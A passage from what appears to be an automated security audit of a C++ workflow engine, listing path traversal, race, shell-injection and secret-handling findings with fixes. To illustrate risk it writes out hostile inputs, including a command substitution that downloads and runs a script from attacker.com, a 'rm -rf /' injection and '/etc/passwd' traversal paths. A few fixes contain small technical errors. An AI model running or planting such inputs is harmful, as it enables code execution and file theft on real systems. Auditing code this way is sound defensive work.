Between `fork` and `setpgid` in the child (and `setpgid` in the parent if used), there is a race: a SIGTERM sent to the parent's process group before `setpgid` completes may be delivered to the child. This is a well-known fork/exec PGID race. Additionally, the child does not reset signal handlers to `SIG_DFL` after `fork`, so any handlers installed in the parent (e.g., for `SIGPIPE`) remain active and may interfere.
- **Impact:** Signals meant for the parent can kill the child prematurely; `SIGPIPE` mishandling may cause silent data loss.
- **Fix:** After `fork` in the child, call `signal(SIG_SETMASK, ...)` to reset the signal mask, reset all non-default handlers with `signal(SIGPIPE, SIG_DFL)` etc., then call `setpgid`. In the parent, also call `setpgid(pid, pid)` immediately after `fork` (tolerating `EACCES`) to close the race window.

---

### MEDIUM — Insecure temp file path predictable and world-accessible

- **Location:** `ExecuteCommandWithCapturedOutput`, `stderrTmpPath`, ~line 295
- **Issue:** `.ja_stderr_tmp` is placed in the task working directory. If the working directory is world-writable or accessible to other users, a local attacker can pre-create that filename as a symlink pointing to an arbitrary file (e.g., `/etc/cron.d/evil`) to capture or overwrite content written by the privileged process.
- **Impact:** Arbitrary file write primitive for a local attacker.
- **Fix:** Use `mkstemp` in a directory with restricted permissions (e.g., `mkstemp` in `/tmp` with `umask(0077)` set beforehand), or switch to the pipe-based approach.

---

### MEDIUM — `std::system("bash --version >NUL 2>&1")` in `ProbeWindowsShell`

- **Location:** `ShellTaskExecutor::ProbeWindowsShell`, ~line 590
- **Issue:** `std::system()` is called unconditionally at startup. On Windows, `std::system` invokes `cmd.exe /c`, which interprets the argument as a shell command. If the `PATH` environment variable has been tampered with (e.g., a malicious `bash.exe` earlier in PATH), this executes arbitrary code. The function is documented as "call once at startup" but there is no enforcement of single-call semantics (`s_WindowsShell` can be overwritten by a concurrent call).
- **Impact:** Potential execution of a malicious `bash` binary on a compromised PATH; race condition on `s_WindowsShell` initialization.
- **Fix:** Use `CreateProcess` with an explicit path (e.g., check known Git Bash locations) instead of `std::system`. Protect `s_WindowsShell` initialization with `std::once_flag` / `std::call_once`.

---

### LOW — `g_ShellTaskExecutorCurrentPathMutex` held across blocking `popen`/pipe reads

- **Location:** `ExecuteCommandWithCapturedOutput`, mutex lock scope, ~line 282–370
- **Issue:** A `std::scoped_lock` is acquired at function entry and held for the entire duration of reading the pipe (which blocks until the child process exits). Any other thread trying to acquire this mutex will stall for the full duration of the child's execution, even though the comment says it is protecting the process-wide current directory — which is not actually changed in this function.
- **Impact:** Thread starvation / deadlock if another component needs the mutex; comment-code mismatch suggests the real invariant is misunderstood, risking future regression where `chdir` is actually called under the lock.
- **Fix:** Remove the mutex from `ExecuteCommandWithCapturedOutput` entirely (no `chdir` is performed), or narrow its scope to only guard the actual current-directory mutation if one is ever re-introduced.


---

### 89_doc_application_workflow_subWorkflowTaskExecutor_h

<a id="89-doc-application-workflow-subworkflowtaskexecutor-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/89_doc_application_workflow_subWorkflowTaskExecutor_h/docu.output.md`



### HIGH Path Traversal via Unvalidated `m_WorkflowFile`
- **Location:** `SubWorkflowTaskExecutor::Execute`, path resolution lambda (~line 97–105)
- **Issue:** `taskDefinition.m_WorkflowFile` is used directly to construct a filesystem path with no validation that the resolved canonical path remains within an expected base directory. `std::filesystem::weakly_canonical` resolves `..` sequences and symlinks, but the result is never checked against any allowed root. An attacker who can influence `m_WorkflowFile` (via a crafted workflow definition, API call, or deserialized task config) can supply values like `../../etc/passwd` or an absolute path to any file on disk.
- **Impact:** Arbitrary file read if the registry lookup triggers file I/O on the resolved path; loading and executing attacker-controlled workflow definitions from outside the intended directory tree.
- **Fix:** After computing `absolutePath`, assert that it begins with the canonical form of the allowed workflow root directory (e.g., `workflowDefinition.m_WorkflowFileDirectoryAbsolute` or a configured base path). Reject any path that does not share that prefix:
  ```
  std::string const canonicalBase = std::filesystem::weakly_canonical(allowedRoot).string();
  if (absolutePath.rfind(canonicalBase, 0) != 0) { /* reject */ }
  ```
  Also reject paths containing null bytes before passing them to filesystem APIs.

---

### MEDIUM Unvalidated Absolute Path Accepted Unconditionally
- **Location:** `SubWorkflowTaskExecutor::Execute`, path resolution lambda (~line 98–103)
- **Issue:** When `taskDefinition.m_WorkflowFile` is already absolute (`raw.is_absolute()`), it is returned as-is without any check that it falls within the permitted workflow directory tree. This is a distinct bypass from the relative-path traversal: an attacker supplying an absolute path entirely circumvents the base-directory anchoring that relative-path handling might otherwise provide.
- **Impact:** Loading workflow definitions from arbitrary absolute paths on the filesystem, including sensitive locations.
- **Fix:** Remove the early-return for absolute paths. Always join to the canonical base directory, or after canonicalization enforce the prefix check described above regardless of whether the original input was relative or absolute.

---

### MEDIUM Secrets/Internal Paths Leaked in Error Messages and Logs
- **Location:** `SubWorkflowTaskExecutor::Execute`, error paths at approximately lines 114–120 and 127–133
- **Issue:** `absolutePath` (the fully resolved filesystem path) is embedded into `taskState.m_LastErrorMessage` and into `LOG_APP_ERROR` output when the child workflow is not found. If `taskState` is serialized back to an API caller, or if logs are accessible to lower-privileged users, internal directory structure and filesystem layout are disclosed. Similarly, `childWorkflowId` and `childRunId` are logged and placed into `taskState.m_CapturedStdout` (~line 148), which may surface internal identifiers to callers.
- **Impact:** Information disclosure: internal directory layout assists further path traversal or targeted attacks; internal workflow/run IDs may enable IDOR or enumeration attacks against the workflow API.
- **Fix:** Return generic error codes or short, opaque messages to callers (e.g., "child workflow not found"). Keep the full path in structured internal logs only, access-controlled separately. Do not place `childRunId` directly into `m_CapturedStdout` without considering whether that field is returned to untrusted callers; if it is, treat run IDs as capabilities and confirm the caller is authorized to receive them.

---

### MEDIUM TOCTOU: Registry Lookup and Enqueue Are Not Atomic
- **Location:** `SubWorkflowTaskExecutor::Execute`, lines ~116 and ~124 (`TryGetWorkflowIdByFilePath` then `EnqueueWorkflowRunAndGetRunId`)
- **Issue:** The workflow file is resolved and looked up in the registry, then separately enqueued. Between these two operations, the registry entry could be removed or replaced by another thread or a concurrent file-watcher event (given the description mentions file watching). `childWorkflowId.value()` passed to `EnqueueWorkflowRunAndGetRunId` is a copy of the ID at lookup time, but the actual workflow backing that ID may have changed.
- **Impact:** A race condition could cause a different (possibly attacker-substituted) workflow definition to be executed under the validated ID, or cause use of a stale, removed workflow.
- **Fix:** Design `WorkflowRegistry` and `WorkflowRuntimeManager` to provide an atomic "look up and enqueue" operation, or hold a registry read-lock across both calls. At minimum, have `EnqueueWorkflowRunAndGetRunId` re-validate that the workflow ID still maps to the same file path before enqueuing.

---

### LOW Null/Empty `m_RuntimeManager` and `m_WorkflowRegistry` Checked at Call Time, Not at Construction
- **Location:** `SubWorkflowTaskExecutor::SetRuntimeManager` (~line 87) and `Execute` (~lines 72–83)
- **Issue:** `m_RuntimeManager` is a raw non-owning pointer set via a separate `SetRuntimeManager` call after construction. There is no enforcement that it is set before `Execute` is called, and no ownership semantics. If the pointed-to `WorkflowRuntimeManager` is destroyed while the executor still holds the pointer (e.g., during engine shutdown with in-flight tasks), `Execute` will dereference a dangling pointer. The null check at the top of `Execute` only catches the "never set" case, not the "already freed" case.
- **Impact:** Use-after-free leading to undefined behavior, potential code execution if the freed memory is reclaimed and written by an attacker-influenced allocation.
- **Fix:** Prefer `std::shared_ptr`/`std::weak_ptr` for `m_RuntimeManager` to enforce lifetime safety. If raw pointers are required by the architecture, document and enforce (via assertions or a registry) that `SetRuntimeManager(nullptr)` is called before the manager is destroyed, and that no `Execute` call can race with teardown.


---

### 90_doc_application_workflow_taskExecutor_h

<a id="90-doc-application-workflow-taskexecutor-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/90_doc_application_workflow_taskExecutor_h/docu.output.md`



### NONE
No security issues identified.


---

### 91_doc_application_workflow_taskExecutorRegistry_h

<a id="91-doc-application-workflow-taskexecutorregistry-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/91_doc_application_workflow_taskExecutorRegistry_h/docu.output.md`



### HIGH Path Traversal via Unvalidated `targetFilename`
- **Location:** `MaterializeFiles`, loop body (~line 140, `std::filesystem::path const targetPath = (taskWorkingDirectoryPath / targetFilename).lexically_normal()`)
- **Issue:** `targetFilename` comes directly from `taskDefinition.m_Materialize` (user-controlled workflow definition) and is appended to `taskWorkingDirectoryPath` with no check that the resulting canonical path stays within `taskWorkingDirectoryPath`. `lexically_normal()` resolves `..` components syntactically but does **not** call `canonical()` or verify the result is a descendant of the intended base directory. A value like `../../etc/cron.d/evil` would escape the working directory.
- **Impact:** An attacker who can supply or modify a workflow definition can write arbitrary files to any location writable by the process, enabling privilege escalation or code execution (e.g., overwriting cron jobs, SSH authorized_keys, or shared libraries).
- **Fix:** After computing `targetPath`, assert containment:
  ```
  auto canonicalBase = std::filesystem::canonical(taskWorkingDirectoryPath, ec);
  auto canonicalTarget = std::filesystem::weakly_canonical(targetPath, ec);
  if (canonicalTarget.string().rfind(canonicalBase.string(), 0) != 0) {
      LOG_APP_ERROR(...); return false;
  }
  ```
  Apply the same check to `sourcePath` (see next finding).

---

### HIGH Path Traversal via Unvalidated Expanded `sourcePath`
- **Location:** `MaterializeFiles`, ~line 125–135 (absolute-path branch and `ResolvePath` branch)
- **Issue:** `expandedSource` is derived from a user-controlled template string after `ExpandTemplate`. If the expansion yields an absolute path or a relative path containing `..`, `sourcePath.lexically_normal()` or `TaskPathResolver::ResolvePath` may produce a path outside the workflow base directory. There is no containment check. An attacker can read (copy out) any file readable by the process, or trigger copies from sensitive paths.
- **Impact:** Arbitrary file read/exfiltration by copying `/etc/passwd`, TLS private keys, or other secrets into a task output directory the attacker can later retrieve.
- **Fix:** After resolving `sourcePath`, verify it is within `workflowBaseDirectoryPath` (or another explicitly allowed directory) using `std::filesystem::canonical` and a prefix check, same pattern as above.

---

### HIGH TOCTOU: Existence Check Separated from File Copy
- **Location:** `MaterializeFiles`, ~line 155–170 (`std::filesystem::exists` then `std::filesystem::copy_file`)
- **Issue:** The code checks `std::filesystem::exists(sourcePath)` and then, in a separate operation, calls `std::filesystem::copy_file`. Between the two calls a symlink can be swapped in (symlink race / TOCTOU), causing the copy to follow the symlink and read an unintended file even if the original existence check passed on a legitimate path.
- **Impact:** On systems where the workflow working directory is writable by another user or process, an attacker can redirect the copy to read arbitrary files (e.g., `/etc/shadow`).
- **Fix:** Remove the separate `exists` check; rely solely on the error code returned by `copy_file`. Additionally, open the source with `O_NOFOLLOW` at the OS level (or use a platform-safe copy that does not follow symlinks on the source side) to prevent symlink substitution.

---

### MEDIUM Uncontrolled `create_directories` for Attacker-Controlled Target Path
- **Location:** `MaterializeFiles`, ~line 145–155 (`std::filesystem::create_directories(targetParent, ec)`)
- **Issue:** `targetParent` is derived from `targetFilename` without containment validation (same root cause as the first finding). The code will create an arbitrary directory tree on the filesystem before the path-traversal check that never actually exists.
- **Impact:** An attacker can create directories anywhere the process has write permission (e.g., `/tmp/evil/`, `/home/user/.ssh/`), which can be a prerequisite for further attacks or denial-of-service via filesystem exhaustion.
- **Fix:** Perform the containment validation on `targetPath` **before** calling `create_directories`, so directory creation only occurs for paths already confirmed to be within the expected base.

---

### LOW Task Type Integer Logged Without Bounds Validation
- **Location:** `TaskExecutorRegistry::Execute`, ~line 185 (`static_cast<int>(taskDefinition.m_Type)`)
- **Issue:** The task type enum value is cast to `int` and emitted in an error log. If `TaskType` is populated from an external/deserialized source and can hold out-of-range values, the logged integer itself leaks internal enum layout. This is a low-severity information disclosure.
- **Impact:** Minor internal enumeration leakage that could assist further exploitation.
- **Fix:** Log the symbolic name (via a `to_string` helper) rather than the raw integer, and validate that the enum value is within the defined range before use.


---

### 92_doc_application_workflow_taskFreshnessChecker_h

<a id="92-doc-application-workflow-taskfreshnesschecker-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/92_doc_application_workflow_taskFreshnessChecker_h/docu.output.md`



### LOW Path information disclosure via debug logs

- **Location:** `TaskFreshnessChecker::IsTaskUpToDate` and `CollectUpstreamOutputTimes`, every `LOG_APP_INFO` call throughout both functions
- **Issue:** Absolute filesystem paths, relative paths, and task IDs are unconditionally emitted to the application log at INFO level with the prefix `[paths debug] debug reason=...`. The log lines include both the raw (potentially attacker-influenced) input path and the resolved absolute path, along with boolean flags derived from them. If log output is accessible to unprivileged users, remote log aggregators, or error-reporting services, this leaks the internal directory layout of the workflow engine host.
- **Impact:** An attacker who can read logs (e.g., via a misconfigured log forwarder, a separate LFI vulnerability, or shared log storage) learns the absolute paths of workflow inputs, outputs, and working directories. This information materially assists path traversal and local privilege-escalation attempts against the host.
- **Fix:** Gate these log lines behind a compile-time or runtime debug/trace level (e.g., `LOG_APP_TRACE` or a `#ifdef DEBUG` guard) so they are not emitted in production builds. At minimum, strip absolute path prefixes from production-level log messages and log only filenames or task-relative paths.

---

### LOW TOCTOU between `fs::exists` and `fs::last_write_time`

- **Location:** `TaskFreshnessChecker::IsTaskUpToDate` (~lines where input and output paths are checked), and `CollectUpstreamOutputTimes` (~lines where upstream output paths are checked)
- **Issue:** Each path is checked for existence with `fs::exists(resolvedPath, errorCode)` and then immediately queried with `fs::last_write_time(resolvedPath, errorCode)` as two separate, non-atomic syscalls. Between the two calls an attacker with write access to the filesystem (or a compromised process sharing the working directory) can replace the file with a symlink pointing to an arbitrary target.
- **Impact:** If the workflow engine acts on the freshness decision to skip re-running a task (i.e., it trusts that a "fresh" output is a legitimate artifact), a symlink swap could cause the engine to accept a malicious file as a valid, up-to-date output without re-generating it. The severity depends on what the engine does with outputs it considers fresh; in a pipeline that feeds AI requests or webhook payloads, this could enable injection of attacker-controlled content into downstream processing.
- **Fix:** Open the file with `open(path, O_NOFOLLOW | O_RDONLY)` (or the platform equivalent) and use `fstat` on the resulting file descriptor to obtain the modification time atomically and without following symlinks. Alternatively, use `fs::symlink_status` combined with a real-path check to reject symlinks in output directories before trusting timestamps.

---

### LOW Unbounded recursion / stack exhaustion via cyclic or deep dependency graphs

- **Location:** `TaskFreshnessChecker::CollectUpstreamOutputTimes`, the recursive call on the `m_DependsOn` loop (~line near the bottom of that function)
- **Issue:** The function recurses into dependency tasks using the call stack. The `visitedTasks` set guards against revisiting the same task ID, preventing infinite loops in genuinely cyclic graphs, but the guard is only effective if cycle validation was enforced upstream. The comment in the source explicitly notes "in case validation was skipped." If the workflow definition is loaded from an external or user-supplied source and cycle-detection was bypassed, a deeply nested but acyclic chain (or a valid cyclic graph that somehow defeats the set) can exhaust the native stack.
- **Impact:** A crafted workflow definition with a very deep dependency chain (thousands of tasks) causes a stack overflow, crashing the process — denial of service against the workflow engine.
- **Fix:** Convert the recursion to an explicit iterative traversal using a `std::stack` or BFS queue. Also enforce a hard depth limit (e.g., 1000 levels) and return an error if exceeded, regardless of whether upstream validation ran.


---

### 93_doc_application_workflow_taskPathResolver_h

<a id="93-doc-application-workflow-taskpathresolver-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/93_doc_application_workflow_taskPathResolver_h/docu.output.md`



### MEDIUM Path Traversal — No Confinement to Workflow Base Directory

- **Location:** `TaskPathResolver::ResolvePath`, `TaskPathResolver::ResolveTaskScopedPath`, `TaskPathResolver::ResolveFreshnessPathsForTask` (impl file, all path-resolution call sites)
- **Issue:** After template expansion via `resolver.ExpandTemplates`, the resulting string is passed directly to `ResolveTaskScopedPath` / `ResolvePath`, which calls `std::filesystem::absolute(...).lexically_normal()`. There is no check that the final resolved path remains under `taskWorkingDirectoryPath` or `workflowBaseDirectoryPath`. A workflow definition or task input/output field containing `../../../etc/passwd` (or an absolute path such as `/etc/shadow`) will resolve without error and be accepted as a valid freshness path.
- **Impact:** An attacker who can supply or modify a workflow file (JCWF), a task definition, or any resolved dataflow value can cause the engine to read (freshness checks, file-input tracking) or write (file-output tracking) arbitrary filesystem paths outside the intended working directory.
- **Fix:** After computing the absolute, lexically-normalized path, assert that it starts with the canonical workflow base directory:

    ```
    fs::path canonical_base = fs::weakly_canonical(taskWorkingDirectoryPath);
    fs::path canonical_result = fs::weakly_canonical(resolvedPath);
    if (!canonical_result.native().starts_with(canonical_base.native() + fs::path::preferred_separator))
        return /* error */;
    ```

    Apply this guard at the end of `ResolveTaskScopedPath` and at every call site in `ResolveFreshnessPathsForTask`.

---

### MEDIUM Sensitive Paths Logged at INFO Level

- **Location:** `TaskPathResolver::ResolveTaskWorkingDirectoryPath` (~line 90, 100), `TaskPathResolver::ResolveTaskScopedPath` (~line 110, 120), `TaskPathResolver::ResolvePath` (~lines 130–195), `TaskPathResolver::ResolveFreshnessPathsForTask` (~lines 220–340)
- **Issue:** Every resolved path — including the workflow base directory, task working directory, all expanded file-input and file-output paths, and the launch CWD — is written unconditionally to the application log at `INFO` level. The log strings also include the raw (pre-expansion) template strings and the post-expansion strings side by side, meaning any secret embedded in a dataflow value that ends up in a path (e.g., an API key used as a directory name or filename component after template expansion) is exposed in log output.
- **Impact:** Log files, log aggregators, or anyone with read access to the log stream learns the full directory layout of every workflow execution. If dataflow-expanded values include credentials or tokens, those are also leaked.
- **Fix:** Reduce path-resolution diagnostics to `DEBUG` or `TRACE` level (not `INFO`) so they are off by default in production builds. Avoid logging the post-expansion form of user-controlled strings at any level above `DEBUG`.

---

### MEDIUM Uncontrolled Input Size / DoS via Unbounded Path Vectors

- **Location:** `TaskPathResolver::ResolveFreshnessPathsForTask` (~lines 290–340), loops over `taskDefinition.m_FileInputs` and `taskDefinition.m_FileOutputs`
- **Issue:** There is no limit on the number of entries in `taskDefinition.m_FileInputs` or `taskDefinition.m_FileOutputs`. Each entry triggers a template-expansion call and a filesystem path construction, and the results are pushed into `inputPathsOut` / `outputPathsOut` without bound. If a workflow definition can be supplied by an untrusted source (or can be modified externally), an attacker can create a task with millions of file entries, causing unbounded memory growth and CPU consumption.
- **Impact:** Denial of service: the engine process consumes memory and CPU proportional to the attacker-controlled list length.
- **Fix:** Enforce a configurable maximum (e.g., 10 000) on the number of file-input and file-output entries before entering the loops. Return `false` and log a warning if exceeded.

---

### LOW Incomplete Base-Leaf Deduplication Logic Allows Incorrect Path Resolution

- **Location:** `TaskPathResolver::ResolvePath`, the `baseLeaf` prefix-stripping block (~lines 160–185)
- **Issue:** The deduplication heuristic checks only whether the first component of `path` equals `baseDirectoryPath.filename()`. This is a name-only comparison (e.g., any directory named `workflows` matches), not a content or identity check. A crafted relative path whose first component happens to equal the base directory leaf name will silently have its prefix stripped and be resolved against `baseParent`, potentially landing outside the intended subtree. The heuristic also fires when `baseDirectoryPath` is empty (in which case `filename()` of an empty path is also empty, and an empty `*pathIterator` match would be incorrect — though `path.begin() != path.end()` guards partially against this).
- **Impact:** Incorrectly resolved paths may cause the freshness tracker to monitor the wrong file, potentially allowing a stale-output bypass: an attacker who can name a directory identically to the workflow base leaf can cause freshness checks to target unrelated files.
- **Fix:** Remove the leaf-deduplication heuristic entirely, or replace it with a canonicalization-based check (`fs::weakly_canonical(baseDirectoryPath / path) == fs::weakly_canonical(someExpectedPath)`). Require callers to supply paths that do not already include the base prefix rather than silently stripping it.


---

### 94_doc_application_workflow_templateEngine_h

<a id="94-doc-application-workflow-templateengine-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/94_doc_application_workflow_templateEngine_h/docu.output.md`



### HIGH shell-injection via unvalidated template expansion into shell commands

- **Location:** `ExpandTemplate`, entire function (templateEngine.cpp, all substitution branches)
- **Issue:** Every substitution branch — `{{inputs}}`, `{{outputs}}`, `{{input[N]}}`, `{{output[N]}}`, `{{slot.NAME}}`, `{{env.NAME}}`, `{{inputs.NAME}}`, and bare-key lookup — inserts replacement values directly into `expandedOut` with no escaping, quoting, or sanitization of shell metacharacters. The comment at the top of the header explicitly states that Strict mode is used for "shell tasks." If the caller passes the resulting string to `popen`, `system`, `execvp` with shell interpretation, or any similar mechanism, injected values control command execution.
- **Impact:** An attacker who controls any input value, file path, environment variable value, or slot value can inject arbitrary shell commands. For example, a file path of `/tmp/x; rm -rf /` or an input value containing `$(curl attacker.com|sh)` would execute when the expanded string is handed to a shell.
- **Fix:** Either (a) shell-escape every replacement value before insertion using a vetted function (e.g., `shlex`-style quoting: wrap in single quotes and escape embedded single quotes as `'\''`), or (b) never expand templates into a flat shell string — instead build an `argv` array and use `execve` directly, keeping each argument separate and never interpreted by a shell.

---

### MEDIUM uncontrolled template size / DoS via amplification

- **Location:** `ExpandTemplate`, while loop (templateEngine.cpp, lines ~90–200)
- **Issue:** There is no limit on the number of `{{...}}` placeholders in `templateText`, no limit on the size of any individual replacement value, and no cap on the total size of `expandedOut`. A caller that allows user-controlled template text or user-controlled input values can cause unbounded `std::string` growth. Each `substr` and `+=` call also allocates; with many large replacements this can exhaust heap memory.
- **Impact:** An attacker who can supply template text or input values (e.g., via a workflow definition or an API request) can cause excessive memory allocation and CPU consumption, resulting in process termination or service unavailability.
- **Fix:** Enforce a maximum length on `templateText` before processing, a maximum length on each replacement value before substitution, a maximum placeholder count, and a maximum total `expandedOut` size (e.g., reject or truncate once a configurable byte limit is exceeded).

---

### MEDIUM secrets leakage through error messages

- **Location:** `ExpandTemplate`, Strict-mode error paths (templateEngine.cpp, lines ~145, ~165, ~180, ~200, ~220)
- **Issue:** Error messages echo back the raw key name or index string from the template, e.g., `"unknown slot '" + slotName + "'"` and `"unknown template key '" + key + "'"`. If an attacker can craft a template with a key that embeds a secret name or a probing string, the error message confirms the existence (or non-existence) of named slots and input keys. More concretely, if `errorMessage` is ever surfaced in an HTTP response, log line, or webhook callback, it reveals internal key/slot naming conventions and can be used to enumerate valid slot names.
- **Impact:** Information disclosure of internal key names; potential oracle for enumerating valid slot/env/input variable names.
- **Fix:** Sanitize or truncate the echoed key before including it in an error message (e.g., limit to 64 printable ASCII characters, strip control characters). Consider whether Strict-mode error detail should be logged internally only and a generic message returned externally.

---

### LOW `JoinFileList` produces shell-unsafe space-separated paths

- **Location:** `JoinFileList` (templateEngine.cpp, lines ~80–90), called from `{{inputs}}` and `{{outputs}}` branches
- **Issue:** File paths are joined with a single space and no quoting. Paths containing spaces, tabs, glob characters (`*`, `?`, `[`), or other metacharacters will be split or misinterpreted by any downstream shell consumer of `{{inputs}}` or `{{outputs}}`. This is a distinct issue from the general injection finding: even well-intentioned paths with spaces break argument parsing.
- **Impact:** Incorrect file handling or shell word-splitting causing unintended command arguments; in combination with crafted filenames, potential injection.
- **Fix:** For shell contexts, single-quote each path in `JoinFileList` and escape embedded single quotes. For non-shell contexts (e.g., Python or JSON), use a structured list rather than a flat string.


---

### 95_doc_application_workflow_triggerEngine_h

<a id="95-doc-application-workflow-triggerengine-h"></a>

*Source doc:* `../../../queue/jarvisCppCyberSecAudit/95_doc_application_workflow_triggerEngine_h/docu.output.md`



### HIGH: Webhook secret stored and compared without constant-time check (secret leakage / timing oracle)

- **Location:** `TriggerEngine::GetWebhookTrigger` (returns raw `WebhookTriggerInstance const*` including `m_Secret`); HMAC comparison is performed by the caller, not shown here, but the secret is handed out in a plain struct pointer.
- **Issue:** `GetWebhookTrigger` returns a pointer to the full `WebhookTriggerInstance`, which contains the raw HMAC-SHA256 shared secret as a `std::string`. Any caller receives the secret in cleartext. If the caller uses `==` or `strcmp` for HMAC comparison, a timing side-channel exists. Additionally, any log that dumps the struct, any crash dump, or any debugger attach to the calling process exposes the secret directly.
- **Impact:** An attacker with read access to process memory, crash dumps, or core files obtains the webhook signing secret and can forge arbitrary webhook requests. A remote attacker against a timing-vulnerable comparison can brute-force the secret byte-by-byte.
- **Fix:** (1) Do not expose the raw secret via the public API. Move HMAC verification into `TriggerEngine` itself, taking the request payload and signature as parameters and returning only a bool. (2) Inside that verification, use a constant-time comparison (e.g. `CRYPTO_memcmp` from OpenSSL, or a hand-rolled loop with no early exit and a volatile accumulator). (3) Scrub the secret string on destruction (`SecureZeroMemory` / `explicit_bzero`).

---

### HIGH: Path traversal — `NormalizePath` does not canonicalize `..` components

- **Location:** `TriggerEngine::NormalizePath` (~line 530 in the .cpp); called by `AddFileWatchTrigger` and `NotifyFileEvent`.
- **Issue:** `NormalizePath` only collapses consecutive slashes and converts backslashes. It does not resolve `.` or `..` segments, drive-relative paths (`C:foo`), or symlinks. A workflow definition supplied from an untrusted source (JSON config, web UI) can register a watch path such as `/safe/dir/../../etc/passwd` or `../../sensitive`. After normalization the path still contains `..`, so `IsPathMatch` will match events on arbitrary filesystem locations.
- **Impact:** An attacker who can submit or influence a JCWF workflow definition can cause the engine to watch and trigger on any file on the filesystem, including sensitive system files or credential stores. Depending on what the fired workflow does with the event path, this may escalate to arbitrary file read or code execution.
- **Fix:** Use `std::filesystem::weakly_canonical` (or `canonical` where the path is expected to exist) on the result of `NormalizePath`. Apply an allowlist of permitted base directories and reject any path that does not start with an allowed prefix after canonicalization.

---

### HIGH: TOCTOU / index invalidation — `job.m_Index` used to index `m_EmailWatchTriggers` after releasing lock

- **Location:** `TriggerEngine::Tick`, email poll section (~lines 390–430 in the .cpp).
- **Issue:** Under the lock, `job.m_Index` is captured as the current position of an `EmailWatchTriggerInstance` in `m_EmailWatchTriggers`. The lock is then released for the IMAP network call. After the call, the code re-acquires the lock and uses `job.m_Index` to access `m_EmailWatchTriggers[job.m_Index]`. Between the two lock acquisitions, `ClearWorkflowTriggers` or `ClearAll` can be called from another thread, which calls `EraseWorkflowFromVector`, shifting or erasing elements. The bounds check `job.m_Index < m_EmailWatchTriggers.size()` prevents an out-of-bounds access, but it does not prevent accessing the *wrong* trigger instance if elements before `job.m_Index` were removed.
- **Impact:** The `m_LastSeenUid` watermark can be written to the wrong trigger, causing missed or spurious email-watch firings. In a worst case, if the vector is reallocated and a trigger for a different (perhaps more sensitive) workflow ends up at that index, an attacker who can trigger a concurrent reload can manipulate which workflows fire.
- **Fix:** Instead of storing a raw vector index, store a stable identifier (composite of `m_WorkflowId` + `m_TriggerId`) in `EmailPollJob`, then look up the trigger by identity under the lock when updating the watermark.

---

### MEDIUM: Uncontrolled resource allocation — no limit on the number of registered triggers

- **Location:** All `Add*Trigger` methods; `m_CronTriggers`, `m_FileWatchTriggers`, `m_WebhookTriggers`, etc.
- **Issue:** There is no cap on how many triggers can be registered. Each call appends unconditionally to a `std::vector`. For cloud-polling triggers, each entry also results in a filesystem watcher path registration or a polling goroutine. A caller who can invoke the registration API (e.g. by uploading many JCWF workflow files) can exhaust memory, file descriptors, or inotify watches.
- **Impact:** Denial of service: the process runs out of memory or OS-level watch descriptors (`inotify` default limit is 8192 watches per user).
- **Fix:** Enforce a configurable maximum trigger count per vector (e.g. 1000 total file-watch triggers). Return an error from `Add*Trigger` when the limit is exceeded and log the rejection.

---

### MEDIUM: Cron expression timezone is injected into `date::locate_zone` / `std::chrono::locate_zone` without sanitization

- **Location:** `TriggerEngine::CronExpression::ComputeNextFireTime` (~line 110 in the .cpp); `TriggerEngine::AddCronTrigger` passes the caller-supplied `timezone` string directly.
- **Issue:** The IANA timezone string is taken verbatim from the workflow definition (ultimately from user-controlled JSON) and passed to `locate_zone`. The IANA timezone database path lookup on non-MSVC platforms (Howard Hinnant date library) searches the filesystem for a file matching the timezone name. A crafted name containing path traversal sequences (e.g. `../../etc/cron.d/evil`) may cause the library to open unintended files. Even without traversal, a very long or binary string may cause unexpected behavior.
- **Impact:** Depending on the date library's implementation, path traversal in the timezone name could lead to arbitrary file reads during zone lookup; at minimum, an invalid string reaching the OS filesystem layer is undesirable.
- **Fix:** Validate the timezone string against a strict allowlist regex (`[A-Za-z0-9/_+-]{1,64}`) before passing it to `locate_zone`. Reject timezone strings containing `.`, `\`, or null bytes.

---

### MEDIUM: Email subject filter logged verbatim — potential log injection

- **Location:** `TriggerEngine::AddEmailWatchTrigger` (~line 290 in the .cpp): `LOG_APP_INFO(... subjectFilter.empty() ? "<all>" : subjectFilter ...)`.
- **Issue:** `subjectFilter` comes from the workflow definition and is logged directly as a format argument. If the logging macro uses a format-string library (e.g. `{fmt}`) this is safe from format-string injection, but if any log sink writes to a terminal or structured log that interprets ANSI escape sequences or newlines, a crafted subject filter such as `"\nERROR: auth bypass"` can inject false log entries.
- **Impact:** Log forgery: an attacker who controls a workflow definition can write arbitrary content into application logs, hiding malicious activity or framing legitimate events.
- **Fix:** Sanitize all user-supplied strings before logging: strip or escape control characters (`\n`, `\r`, ANSI CSI sequences). Consider a log-sanitization helper applied to any externally sourced string before it reaches a log call.

---

### MEDIUM: `FireManualTrigger` performs linear scan without authorization check

- **Location:** `TriggerEngine::FireManualTrigger` (~line 470 in the .cpp).
- **Issue:** The method accepts a `workflowId` and `triggerId` from the caller (described as "CLI / Web UI") and fires the trigger if a matching, enabled `ManualTriggerInstance` exists. There is no authentication or authorization check inside this method. The comment acknowledges the Web UI as a caller, meaning a network-reachable path exists. Any caller that can reach this function can fire any registered manual trigger.
- **Impact:** An unauthenticated or insufficiently authorized HTTP client, if the Web UI handler does not enforce access control before calling `FireManualTrigger`, can trigger arbitrary workflows.
- **Fix:** `TriggerEngine` should not be responsible for AuthZ, but it must not silently trust callers. Document explicitly that callers *must* enforce authentication before calling this method, and if possible add an `AuthToken` parameter or a caller-identity assertion so the contract is enforced at the API boundary rather than relying solely on the HTTP layer.

---

### LOW: Webhook trigger allows empty secret at runtime despite comment saying it is rejected

- **Location:** `AddWebhookTrigger` (~line 250 in the .cpp); `WebhookTriggerInstance::m_Secret` field.
- **Issue:** The header comment for `AddWebhookTrigger` states "Mandatory — the validator rejects webhook triggers with an empty secret." However, `AddWebhookTrigger` in the .cpp unconditionally stores the trigger regardless of whether `secret` is empty, with no assertion or early return. The claimed rejection is entirely deferred to an external validator not present in this file. If that validator is bypassed or absent, open (unauthenticated) webhook triggers are silently registered.
- **Impact:** If a workflow reaches `AddWebhookTrigger` with an empty secret (validator misconfiguration, test path, etc.), the webhook fires on any HTTP request with no HMAC verification, allowing unauthenticated workflow execution.
